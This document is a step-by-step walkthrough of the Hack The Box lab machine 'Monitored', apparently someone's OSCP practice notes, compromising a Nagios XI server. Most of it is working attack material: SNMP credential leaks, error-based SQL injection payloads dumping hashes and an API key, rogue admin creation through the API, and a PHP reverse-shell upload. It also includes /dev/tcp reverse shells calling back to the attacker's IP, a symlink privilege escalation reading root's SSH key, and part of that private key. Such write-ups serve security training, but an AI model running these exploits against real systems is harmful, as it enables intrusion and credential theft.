## Reconnaissance
- Nmap Enumeration:
	```bash
	nmap -sV -sC -vv -p- 10.10.11.248
PORT     STATE SERVICE    REASON         VERSION
22/tcp   open  ssh        syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 61:e2:e7:b4:1b:5d:46:dc:3b:2f:91:38:e6:6d:c5:ff (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/xFgJTbVC36GNHaE0GG4n/bWZGaD2aE7lsFUvXVdbINrl0qzBPVCMuOE1HNf0LHi09obr2Upt9VURzpYdrQp/7SX2NDet9pb+UQnB1IgjRSxoIxjsOX756a7nzi71tdcR3I0sALQ4ay5I5GO4TvaVq+o8D01v94B0Qm47LVk7J3mN4wFR17lYcCnm0kwxNBsKsAgZVETxGtPgTP6hbauEk/SKGA5GASdWHvbVhRHgmBz2l7oPrTot5e+4m8A7/5qej2y5PZ9Hq/2yOldrNpS77ID689h2fcOLt4fZMUbxuDzQIqGsFLPhmJn5SUCG9aNrWcjZwSL2LtLUCRt6PbW39UAfGf47XWiSs/qTWwW/yw73S8n5oU5rBqH/peFIpQDh2iSmIhbDq36FPv5a2Qi8HyY6ApTAMFhwQE6MnxpysKLt/xEGSDUBXh+4PwnR0sXkxgnL8QtLXKC2YBY04jGG0DXGXxh3xEZ3vmPV961dcsNd6Up8mmSC43g5gj2ML/E=
|   256 29:73:c5:a5:8d:aa:3f:60:a9:4a:a3:e5:9f:67:5c:93 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBbeArqg4dgxZEFQzd3zpod1RYGUH6Jfz6tcQjHsVTvRNnUzqx5nc7gK2kUUo1HxbEAH+cPziFjNJc6q7vvpzt4=
|   256 6d:7a:f9:eb:8e:45:c2:02:6a:d5:8d:4d:b3:a3:37:6f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB5o+WJqnyLpmJtLyPL+tEUTFbjMZkx3jUUFqejioAj7
80/tcp   open  http       syn-ack ttl 63 Apache httpd 2.4.56
|_http-title: Did not follow redirect to https://nagios.monitored.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.56 (Debian)
389/tcp  open  ldap       syn-ack ttl 63 OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http   syn-ack ttl 63 Apache httpd 2.4.56 ((Debian))
| tls-alpn: 
|_  http/1.1
|_http-title: Nagios XI
| ssl-cert: Subject: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK/localityName=Bournemouth/emailAddress=support@monitored.htb
| Issuer: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK/localityName=Bournemouth/emailAddress=support@monitored.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-11-11T21:46:55
| Not valid after:  2297-08-25T21:46:55
| MD5:   b36a:5560:7a5f:047d:9838:6450:4d67:cfe0
| SHA-1: 6109:3844:8c36:b08b:0ae8:a132:971c:8e89:cfac:2b5b
| -----BEGIN CERTIFICATE-----
| MIID/zCCAuegAwIBAgIUVhOvMcK6dv/Kvzplbf6IxOePX3EwDQYJKoZIhvcNAQEL
| BQAwgY0xCzAJBgNVBAYTAlVLMQ8wDQYDVQQIDAZEb3JzZXQxFDASBgNVBAcMC0Jv
| dXJuZW1vdXRoMRIwEAYDVQQKDAlNb25pdG9yZWQxHTAbBgNVBAMMFG5hZ2lvcy5t
| b25pdG9yZWQuaHRiMSQwIgYJKoZIhvcNAQkBFhVzdXBwb3J0QG1vbml0b3JlZC5o
| dGIwIBcNMjMxMTExMjE0NjU1WhgPMjI5NzA4MjUyMTQ2NTVaMIGNMQswCQYDVQQG
| EwJVSzEPMA0GA1UECAwGRG9yc2V0MRQwEgYDVQQHDAtCb3VybmVtb3V0aDESMBAG
| A1UECgwJTW9uaXRvcmVkMR0wGwYDVQQDDBRuYWdpb3MubW9uaXRvcmVkLmh0YjEk
| MCIGCSqGSIb3DQEJARYVc3VwcG9ydEBtb25pdG9yZWQuaHRiMIIBIjANBgkqhkiG
| 9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1qRRCKn9wFGquYFdqh7cp4WSTPnKdAwkycqk
| a3WTY0yOubucGmA3jAVdPuSJ0Vp0HOhkbAdo08JVzpvPX7Lh8mIEDRSX39FDYClP
| vQIAldCuWGkZ3QWukRg9a7dK++KL79Iz+XbIAR/XLT9ANoMi8/1GP2BKHvd7uJq7
| LV0xrjtMD6emwDTKFOk5fXaqOeODgnFJyyXQYZrxQQeSATl7cLc1AbX3/6XBsBH7
| e3xWVRMaRxBTwbJ/mZ3BicIGpxGGZnrckdQ8Zv+LRiwvRl1jpEnEeFjazwYWrcH+
| 6BaOvmh4lFPBi3f/f/z5VboRKP0JB0r6I3NM6Zsh8V/Inh4fxQIDAQABo1MwUTAd
| BgNVHQ4EFgQU6VSiElsGw+kqXUryTaN4Wp+a4VswHwYDVR0jBBgwFoAU6VSiElsG
| w+kqXUryTaN4Wp+a4VswDwYDVR0TAQH/BAUwAwEB/zANBgkqhkiG9w0BAQsFAAOC
| AQEAdPGDylezaB8d/u2ufsA6hinUXF61RkqcKGFjCO+j3VrrYWdM2wHF83WMQjLF
| 03tSek952fObiU2W3vKfA/lvFRfBbgNhYEL0dMVVM95cI46fNTbignCj2yhScjIz
| W9oeghcR44tkU4sRd4Ot9L/KXef35pUkeFCmQ2Xm74/5aIfrUzMnzvazyi661Q97
| mRGL52qMScpl8BCBZkdmx1SfcVgn6qHHZpy+EJ2yfJtQixOgMz3I+hZYkPFjMsgf
| k9w6Z6wmlalRLv3tuPqv8X3o+fWFSDASlf2uMFh1MIje5S/jp3k+nFhemzcsd/al
| 4c8NpU/6egay1sl2ZrQuO8feYA==
|_-----END CERTIFICATE-----
|_http-server-header: Apache/2.4.56 (Debian)
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
5667/tcp open  tcpwrapped syn-ack ttl 63
Service Info: Host: nagios.monitored.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
	- Uses https
- UDP Port check:
	```bash
nmap -sU --top-ports=10 10.10.11.248 # top ports makes it faster but doesn't check all ports
PORT    STATE         SERVICE  REASON
68/udp  open|filtered dhcpc    no-response
123/udp open          ntp      udp-response ttl 63
161/udp open          snmp     udp-response ttl 63
162/udp open|filtered snmptrap no-response
```
	- SNMP port is open, can enumerate there
- Fuff reveals nagios.monitored.htb which site redirects to anyway when entering IP
## SNMP Enumeration
- snmpwalk :
	```bash
snmpwalk -v 2c -c public nagios.monitored.htb
# -v 2c for version 2c
# -c public : uses public as community string which is often the default for read-only access
---OUTPUT---
(Things i found important)
iso.3.6.1.2.1.25.4.2.1.5.1418 = STRING: "-u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB"
iso.3.6.1.2.1.25.4.2.1.5.1419 = STRING: "-c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB"
```
	- Username: svc
	- Password : XjH7VCehowpR1xZB
-----
## Web Login
- We try to login with these credentials but it says:
	```bash
The specified user account has been disabled or does not exist.
```
- Next, we'd see if there is a way to login via API
	- Search in google:
		```bash
nagios api login
> Help with insecure login / backend ticket authentication.
```
		- We find a post : Help with insecure login / backend ticket authentication.
			- We see two commands related to api auth tokens:
				```bash
curl -XPOST -k -L 'http://YOURXISERVER/nagiosxi/api/v1/authenticate?pretty=1' -d 'username=nagiosadmin&password=YOURPASS&valid_min=5'
curl -k -L 'http://YOURXISERVER/nagiosxi/includes/components/nagioscore/ui/trends.php?createimage&host=localhost&token=TOKEN' > image.png
```
- Simply pass the first command with our credentials and url
	- We get auth key
	- Enter the url in the second in the browser and add the auth_key to it as well as change localhost to svc
	```bash
curl -XPOST -k -L 'http://nagios.monitored.htb/nagiosxi/api/v1/authenticate?pretty=1' -d 'username=svc&password=XjH7VCehowpR1xZB&valid_min=5'

----
In URL
----
https://nagios.monitored.htb/nagiosxi/includes/components/nagioscore/ui/trends.php?createimage&host=localhost&token=217f500ba4283343470fd709300c6dd6f1dbce91
```
- To understand better we use Burp Suite
	- Intercept the svc login packet
	- Change the POST location to :
		```bash
POST /nagiosxi/api/v1/authenticate HTTP/1.1 # in first command we see this location
```
		- We send packet and get our auth_token
	- We can then simply add to url:
		```bash
https;//nagios.monitored.htb/nagiosx/?token=270919a8a6752beef9126eeb3695d869cd8e96da
```
		- We should login as svc
			- Alternatively we can go to the url and do what we did earlier and it should still work.
---
# Initial Website Foothold
- On searching online I stumble upon :
	- https://rootsecdev.medium.com/notes-from-the-field-exploiting-nagios-xi-sql-injection-cve-2023-40931-9d5dd6563f8c
		- Mainly talks about the location where the SQL injection worjs
	- I implement this by capturing my logged in web page and changing the details to that. My POST Request being
		```bash
POST /nagiosxi/admin/banner_message-ajaxhelper.php HTTP/1.1
Host: nagios.monitored.htb
Cookie: nagiosxi=6vhk017rhnugos6tpnmhu0u1rt
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Cache-Control: max-age=0
Te: trailers
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 38

action=acknowledge_banner_message&id=1'or 1=1-- -
```
		- the error doesn't come if we enter 1 (or any numberic value but anything else or with ' or 1=1-- - it gives an SQL error)
		- Key notes being the action= command in the end and the POST location in the start
			- I also had to change some other stuff (replaced everything from Accept-Language to Content-Length to the exploit I found online)
				- Receive SQL error
	- Alternatively I simply post the location following by /? and the action command and i receive an SQL error in the browser
	```bash
https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php/?action=acknowledge_banner_message&id=1%27or%201=1--%20-
```
	- Thus SQLi is confirmed and we move on to enumerating using sqlmap (NON OSCP Route)
		- But first we focus on doing it manually for my OSCP Training
		- the sqlmap route will be shown after as its faster
		- **Error based SQL Injection**
			- not as straight forward as a union
			- One way is XPATH injection
				- We use a function `EXTRACTVALUE`
## Manual SQL Enumeration from SQL Error Based Vulnerability
- We can search sql EXTRACTVALUE injection to find some websites. I checked Akimbo and it gave me the following syntax.
	```bash
AND ExtractValue('',Concat('=',@@version))
```
- In the action command above, we use the following command:
	```bash
action=acknowledge_banner_message&id=4 AND EXTRACTVALUE=AND ExtractValue('',Concat('=',@@version))
```
	- we get the version : 10.5.23-MariaDB-0+deb11u1
	- **Note: As we said earlier its an error based injection so commands likr Union or ' or 1=1-- - won't work. so we don't add any '  in our injection. Any non numeric value works (i.e we get SQL Error) so it is already injecting**
- Now we need to find database data. Since we don't know any database, we check the default one, i.e, INFORMATION_SCHEMA.
	- https://dev.mysql.com/doc/refman/8.4/en/information-schema-table-reference.html
- Enumerate : 
	- SCHEMATA : information about databases
		- https://dev.mysql.com/doc/refman/8.4/en/information-schema-schemata-table.html
		- SCHEMA_NAME : holds names of databases
			- We need to find the right syntax to enter
				```bash
action=acknowledge_banner_message&id=5 AND ExtractValue('',Concat('=',(SELECT GROUP_CONCAT(SCHEMA_NAME) from INFORMATION_SCHEMA.SCHEMATA)))
```
				- Why GROUP_CONCAT?
					- If you see how sql shows the database it would be a single column ith multiple rows with each row pointing to a table.
					- GROUP_CONCAT merges them all into one row else our output would show only one value
			- We get the following databases:
				- INFORMATION_SCHEMA (default)
				- nagiosxi
	-  COLUMNS : Information about the columns in each table
		- https://dev.mysql.com/doc/refman/8.4/en/information-schema-columns-table.html
		- We know the TABLE_SCHEMA to use (nagiosxi)
			- From that we will look for the TABLE_NAME and COLUMN_NAME.
				```bash
action=acknowledge_banner_message&id=1 AND ExtractValue('',Concat('=',(SELECT GROUP_CONCAT(TABLE_NAME,":",COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS where TABLE_SCHEMA='nagiosxi'))) # the : is to make it more clean for us
```
				- We get some information:
					```bash
xi_deploy_agents:deploy_id,x...
```
					- Character limit of some kind
			- We need to get the information one at a time.
				- No more GROUP_CONCAT
				- Add LIMIT command as we will get an error saying there are more than one rows
	- TABLES : Information on tables
		- https://dev.mysql.com/doc/refman/8.4/en/information-schema-tables-table.html
		```bash
action=acknowledge_banner_message&id=1 AND ExtractValue('',Concat('=',(SELECT TABLE_NAME from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA='nagiosxi' LIMIT 0,1)))     # we change (0,1), (1,1) and so on
```
		- We send to intruder to brute force it and find all tables
			- Select the first limit value as the payload.
			- Change payload to numbers
				- 0-30
			- **TO MAKE IT EVEN MORE USER FRIENDLY**
				- we can use concat to help as an identifier
					```bash
action=acknowledge_banner_message&id=1 AND ExtractValue('',Concat('=',(SELECT CONCAT("|",TABLE_NAME) from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA='nagiosxi' LIMIT 0,1)))
```
				- This gives us the output starting with | and ending with '
					```bash
|xi_deploy_agents'
```
					- Weuse it as an identify for Grep Extract
				- Under Intruder Settings, we should find Grep Extract and we can add that it we start after | and end after '
			- Now when we start our attack, it should list all the table names there instead of having to click on each request.
			- Some interesting table names:
				- **users**
				- auth_tokens
	- **Back to COLUMNS**
		- We execute the following command without GROUP_CONCAT:
			```bash
action=acknowledge_banner_message&id=1 AND ExtractValue('',Concat('=',(SELECT CONCAT("|",COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS where TABLE_SCHEMA='nagiosxi' and TABLE_NAME='xi_users' LIMIT 0,1)))
```
			- Out of the output a few interesting columns stand out:
				- username
				- password
				- enabled
				- api_key
				- api_enabled
	- Now we check for username and password:
		- Username:
			```bash
action=acknowledge_banner_message&id=1 AND ExtractValue('',Concat('=',(SELECT CONCAT("|",username) from xi_users LIMIT 0,1)))
```
			- We find :
				- nagiosadmin
				- svc
	- We try the same for password:
		```bash
action=acknowledge_banner_message&id=1 AND ExtractValue('',Concat('=',(SELECT CONCAT("|",password) from xi_users LIMIT 0,1)))
```
		- We don't get a full output due to the character limit.
			- we try api_key but it's the same
		- On searching google for "sql show part of string" I found 
			- SUBSTRING() function
		- We include that in our command:
			```bash
> action=acknowledge_banner_message&id=1 AND ExtractValue('',Concat('=',(SELECT SUBSTRING(password,1,28) from xi_users LIMIT 0,1)))
---OUTPUT---
$2a$10$825c1eec29c150b118fe7
----
> action=acknowledge_banner_message&id=1 AND ExtractValue('',Concat('=',(SELECT SUBSTRING(password,29,56) from xi_users LIMIT 0,1)))
---OUTPUT---
unSfxq80cf7tHwC0J0BG2qZiNzWR
----
> action=acknowledge_banner_message&id=1 AND ExtractValue('',Concat('=',(SELECT SUBSTRING(password,57,84) from xi_users LIMIT 0,1)))
---OUTPUT---
Ux2C
```
			- Password: $2a$10$825c1eec29c150b118fe7unSfxq80cf7tHwC0J0BG2qZiNzWRUx2C
			- We try to crack it with John The Ripper tool
				```bash
vi hash # Paste hash here
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```
				- **Hash could not be cracked**
				- Also checked hash identifier online and it suggested the same hash type john the ripper tool chose
	- We try to get the api_key with the same method:
		```bash
> action=acknowledge_banner_message&id=1 AND ExtractValue('',Concat('=',(SELECT SUBSTRING(api_key,1,28) from xi_users LIMIT 0,1)))
---OUTPUT---
IudGPHd9pEKiee9MkJ7ggPD89q3Y
----
> action=acknowledge_banner_message&id=1 AND ExtractValue('',Concat('=',(SELECT SUBSTRING(api_key,29,56) from xi_users LIMIT 0,1)))
---OUTPUT---
ndctnPeRQOmS2PQ7QIrbJEomFVG6
----
> action=acknowledge_banner_message&id=1 AND ExtractValue('',Concat('=',(SELECT SUBSTRING(api_key,57,84) from xi_users LIMIT 0,1)))
---OUTPUT---
Eut9CHLL
```
		- api_key : IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL
## SQLMAP method (Non-OSCP route)
- If we uesd sqlmap, we could capture the request and put * at the injection point (which is basically after id=). Let's say we name id inject.req
	```bash
sqlmap -r inject.req --batch --force-ssl --dbms mysql #should find error based injection
sqlmap -r inject.req --batch --force-ssl --dbms mysql -D nagiosxi --tables
sqlmap -r inject.req --batch --force-ssl --dbms mysql -D nagiosxi -T xi_users --dump
```
	- Note Error based SQL injection is slower and so sqlmap will also be slower than usual
## Website Privilege Escalation
- Now we need to find a way to login via our API_KEY
- On searching for Nagios XI vulnerabilities either from searchsploit or online (searched nagiox xi api_key login sql) we find the following SQLi Exploit:
	- https://www.exploit-db.com/exploits/51925
		- One reading the code, there are a few things that imply it is related to us.
			- First being that it follows our previous steps from servicelogin() function of authenticating our svc user by grabbing it's token and then searching for the api_key (using SQLmap in the code).
			- The createadmin() function implies that we create a new admin user (random_username and random_password implying it is not a known credential)
			- We try to recreate this function in our post request in BurpSuite to see if we can create an admin user.
				- We ceate a post request with the following details, the main being the last line and the POST location
					```bash
POST /nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL HTTP/1.1
Host: nagios.monitored.htb
Cookie: nagiosxi=6vhk017rhnugos6tpnmhu0u1rt
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Cache-Control: max-age=0
Te: trailers
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 92

username=rocknrj&password=rocknrjpwnd&name=rocknrj&email=rocknrj@mail.com&auth_level=admin


---RESPONSE---
"success":"User account rocknrj was added successfully!","user_id":6
```
					- Based on the response, we now try to login as the newly created user rocknrj.
						- Login as admin successful
## Initial Foothold of System (as user www-data)

**NOTE: This is the method I initially entered and so it is listed first, but the preferred method is right after this section. However there is no issue with this route as I've tested it myself**
- Next we try to obtain a reverse shell
- On searching online (or searchsploit) we find a link:
	- https://www.nccgroup.com/us/research-blog/technical-advisory-multiple-vulnerabilities-in-nagios-xi/
		- What interests us here is option 4: "Remote Code Execution Via Custom Includes (CVE-2023-47400)"
		- Provides us with a link to upload Custom Includes
			- https://nagios.monitored.htb/nagiosxi/includes/components/custom-includes/manage.php
		- We recreate this via the details provided
			```bash
touch test.gif
echo "GIF8;" > test.gif #for magic bytes
file test.gif # to check if it shows as GIF image
touch test2.gif.php
echo "GIF8;" > test2.gif.php
cat php-reverse-shell.php >> test2.gif.php # Append our pentest monkey reverse shell with our details to the file (make sure >> for appending and not replacing)
nv -lvnp 9999


---ON-THE-WEBSITE---
url : https://nagios.monitored.htb/nagiosxi/includes/components/custom-includes/manage.php
add test.gif 
rename test.gif to .htaccess # To replace .htaccess file inside
rename back to test.gif
Upload our exploit test2.gif.php
Rename to test2.php
Access file location via url : https://nagios.monitored.htb/nagiosxi/includes/components/custom-includes/images/test2.php
```
			- We obtain shell as www-data and can get user.txt flag
**Note: However with www-data we cannot move ahead as we need access to user nagios**
## Initial Foothold of System (as user nagios) - Preferred
- The other route we could take, and is far more simpler is to go to :
	- Configuration > Core Config Manager > Commands
		- Create new command ReverseShell with the command :
			```bash
bash -c 'bash -i >& /dev/tcp/<local_ip>/9998 0>&1'
```
	- Apply Configuration
	- Go back to Core Config Manager and then goto Services
		- Add New > Search for "ReverseShell" under check command option.
			  - Run Check command with netcat listener listening
	- We gain access as nagios
		- To gain better shell
			```bash
python3 -c ‘import pty;pty.spawn(“/bin/bash”)’ # may have issues copying from here to terminal so type it
Ctrl+z
stty raw -echo;fg
Enter+Enter
```
## Privilege Escalation of System to root user 
### This part was done as user www-data (works the same as nagios user)
**NOTE: I tried the same steps as with user nagios as shown below. It works however I also tried to create the symlink on files owned by www-data which was only cfg files. But when I tried to read those files it said no such files or directory. I believe this has to do with the file type I linked. Log files must be more ideal**
- I get better shell with the command :
	```bash
script /dev/null -c bash # this doesn't work as good as the python command method
```
- I pass sudo -l to see what commands can be passed as www-data
	```bash
sudo -l

---OUTPUT---
User www-data may run the following commands on localhost:
    (root) NOPASSWD: /etc/init.d/snmptt restart
    (root) NOPASSWD: /usr/bin/tail -100 /var/log/messages
    (root) NOPASSWD: /usr/bin/tail -100 /var/log/httpd/error_log
    (root) NOPASSWD: /usr/bin/tail -100 /var/log/mysqld.log
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/components/autodiscover_new.php *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/repair_databases.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh *
```
----
### This part was done as user nagios
- We pass sudo -l to see what commands can be passed as nagios:
	```bash
sudo -l

---OUTPUT---
User nagios may run the following commands on localhost:
    (root) NOPASSWD: /etc/init.d/nagios start
    (root) NOPASSWD: /etc/init.d/nagios stop
    (root) NOPASSWD: /etc/init.d/nagios restart
    (root) NOPASSWD: /etc/init.d/nagios reload
    (root) NOPASSWD: /etc/init.d/nagios status
    (root) NOPASSWD: /etc/init.d/nagios checkconfig
    (root) NOPASSWD: /etc/init.d/npcd start
    (root) NOPASSWD: /etc/init.d/npcd stop
    (root) NOPASSWD: /etc/init.d/npcd restart
    (root) NOPASSWD: /etc/init.d/npcd reload
    (root) NOPASSWD: /etc/init.d/npcd status
    (root) NOPASSWD: /usr/bin/php
        /usr/local/nagiosxi/scripts/components/autodiscover_new.php *
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/send_to_nls.php *
    (root) NOPASSWD: /usr/bin/php
        /usr/local/nagiosxi/scripts/migrate/migrate.php *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/upgrade_to_latest.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/change_timezone.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/reset_config_perms.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_ssl_config.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/backup_xi.sh *
```
- We read the scripts and find getprofile.sh to be interesting
	```bash
cat /usr/local/nagiosxi/scripts/components/getprofile.sh


---INTERESTING-OUTPUT-FOUND---

# Make a clean folder (but save profile.html)
rm -rf "/usr/local/nagiosxi/var/components/profile/$folder/"
mkdir "/usr/local/nagiosxi/var/components/profile/$folder/"
mv -f "/usr/local/nagiosxi/tmp/profile-$folder.html" "/usr/local/nagiosxi/var/components/profile/$folder/profile.html"

---------------------------------------------------------------------------------

## temporarily change to that directory, zip, then leave
    zip -r profile.zip "profile-$ts"
    mv -f profile.zip ../
    
---------------------------------------------------------------------------------

tail -n500 /usr/local/nagiosxi/var/cmdsubsys.log > "/usr/local/nagiosxi/var/components/profile/$folder/nagios-logs/cmdsubsys.txt"

---------------------------------------------------------------------------------

echo "Getting phpmailer.log..."
if [ -f /usr/local/nagiosxi/tmp/phpmailer.log ]; then
    tail -100 /usr/local/nagiosxi/tmp/phpmailer.log > "/usr/local/nagiosxi/var/components/profile/$folder/phpmailer.log"
fi
---------------------------------------------------------------------------------
(NOT REALLY RELEVANT BUT WE DO FIND SOME CREDENTIALS WHICH DONT WORK)

    if which mysqladmin >/dev/null 2>&1; then
        errlog=$(mysqladmin -u root -pnagiosxi variables | grep log_error)
        if [ $? -eq 0 ] && [ -f "$errlog" ]; then
            /usr/bin/tail -n500 "$errlog" > "/usr/local/nagiosxi/var/components/profile/$folder/logs/database_errors.txt"
        fi
    fi
```
	- It seems to remove a folder and then create one add some stuff and then zip it.
		- **When zip is used, it creates a big possibility for sym link exploits.**
		- Here we can use **cmdsubsys.log** or **phpmailer.log** as they are both owned by user nagios. We can check using the `stat /path/to/file` command or `ls -al /path/to/file` command to find out. 
			```bash
---FOR-cmdsubsys.log---
ls -al /usr/local/nagiosxi/var/cmdsubsys.log
OR
stat /usr/local/nagiosxi/var/cmdsubsys.log # and check the uid field

---FOR-phpmailer.log---
ls -al /usr/local/nagiosxi/tmp/phpmailer.log
OR
stat /usr/local/nagiosxi/tmp/phpmailer.log
```
	- **WE PROCEED WITH cmdsubsys.log HERE** but I tried the ssh method with phpmailer.log (as www-data) and that worked too. 
		- I also tried the unstable method as www-data and that worked too.
	- We make a note of where it is saved and where the log is collected:
		```bash
---COLLECTED-FROM---
/usr/local/nagiosxi/var/cmdsubsys.log

---SAVED-TO---
/usr/local/nagiosxi/var/components/profile/$folder/nagios-logs/cmdsubsys.txt
```
	- We check file permissions for cmdsubsys.log
		```bash
ls -al /usr/local/nagiosxi/var/cmdsubsys.log
```
		- owned by nagios (but www-data has same privileges as nagios)
	- We move it to a temporary file and create a link to /root/root.txt to this file location (the original file name)
		```bash
cd /usr/local/nagiosxi/var
mv cmdsubsys.log cmdsubsys.log~
ln -s /root/root.txt cmdsubsys.log # ideally add path to cmdsubsys.log but since we are in the directory it works
---OR---
ln -s /root/.ssh/id_rsa cmdsubsys.log # get the private ssh key for root
```
		- How do we know root has private key stored?
			- We can check via :
				```bash
cat /etc/ssh/sshd_config | grep -E 'PermitRootLogin|PubkeyAuthentication'

--OUTPUT---
PermitRootLogin prohibit-password
PubkeyAuthentication yes
# the setting of "PermitRootLogin without-password".
```
	- Then we proceed to execute the getprofile.sh command with an argument (we pass 1)
		```bash
sudo /usr/local/nagiosxi/scripts/components/getprofile.sh 1
```
	- On navigating to the path it was saved to:
		```bash
cd /usr/local/nagiosxi/var/components/
ls -al
```
		- We find profile.zip. We move it to /tmp folder to unzip
			```bash
mv profile.zip /tmp
cd /tmp
unzip profile.zip
```
	- Then we move to the location of the file
		```bash
cd profile-1743537335/nagios-logs
cat cmdsubsys.log
```
		- On reading it, we catch the root.txt flag
		- **Alternatively, if you grabbed the private ssh key it should show here. (Key shown at bottom of notes)**
			- We can then copy the key to our local machine and ssh into it
				```bash
vi id_rsa # Copy the private key we got on target machine
chmod 0600 id_rsa
ssh -i id_rsa root@monitored.htb
```
## Alternate method (Unintended and Unstable)
- In sudo -l **as nagios user** we also see these:
	```bash
(root) NOPASSWD: /etc/init.d/nagios restart
(root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh *
```
- `manage_services.sh` let's us restart nagios
	- if we do ps -ef (grep nagios for more ease to find) we find the path, we have the bin file path
		```bash
ps -ef | grep "nagios"
---OUTPUT---
nagios      6856    6736  0 12:32 ?        00:00:01 /usr/local/nagios/bin/nagios -d /usr/local/nagios/etc/nagios.cfg
```
		- /usr/local/nagios/bin/nagios
			- If we stat this, we see user nagios owns this:
				```bash
stat /usr/local/nagios/bin/nagios

--OUTPUT--
Access: (0774/-rwxrwxr--)  Uid: ( 1001/  nagios)   Gid: ( 1001/  nagios)
```
- **So if we replace this binary with another binary file or a script, it will execute it when we restart nagios**
**NOTE : NOT RECOMMENDED as we are replacing a service binary (as opposed to a log file in the original method). So when we restart the service (with our script) there is a high chance that the service will go down and create and outage.**
- So we create out shell script with our usual reverse shell exploit in it and replace it with this binary and restart the service.
	```bash
cd /usr/local/nagios/bin
mv nagios nagios~
vi nagios
chmod +x nagios
sudo /usr/local/nagiosxi/scripts/manage_services.sh restart nagios


---INPUT-FOR-NAGIOS---
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.25/9999 0>&1
```
	- We obtain reverse shell as root in our netcat listener shell.
-----
## Extra details
- root ssh private key
	```bash
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAnZYnlG22OdnxaaK98DJMc9isuSgg9wtjC0r1iTzlSRVhNALtSd2C
FSINj1byqeOkrieC8Ftrte+9eTrvfk7Kpa8WH0S0LsotASTXjj4QCuOcmgq9Im5SDhVG7/
z9aEwa3bo8u45+7b+zSDKIolVkGogA6b2wde5E3wkHHDUXfbpwQKpURp9oAEHfUGSDJp6V
bok57e6nS9w4mj24R4ujg48NXzMyY88uhj3HwDxi097dMcN8WvIVzc+/kDPUAPm+l/8w89
9MxTIZrV6uv4/iJyPiK1LtHPfhRuFI3xe6Sfy7//UxGZmshi23mvavPZ6Zq0qIOmvNTu17
V5wg5aAITUJ0VY9xuIhtwIAFSfgGAF4MF/P+zFYQkYLOqyVm++2hZbSLRwMymJ5iSmIo4p
lbxPjGZTWJ7O/pnXzc5h83N2FSG0+S4SmmtzPfGntxciv2j+F7ToMfMTd7Np9/lJv3Yb8J
/mxP2qnDTaI5QjZmyRJU3bk4qk9shTnOpXYGn0/hAAAFiJ4coHueHKB7AAAAB3NzaC1yc2
EAAAGBAJ2WJ5RttjnZ8WmivfAyTHPYrLkoIPcLYwtK9Yk85UkVYTQC7UndghUiDY9W8qnj
pK4ngvBba7XvvXk6735OyqWvFh9EtC7KLQEk144+EArjnJoKvSJuUg4VRu/8/WhMGt26PL
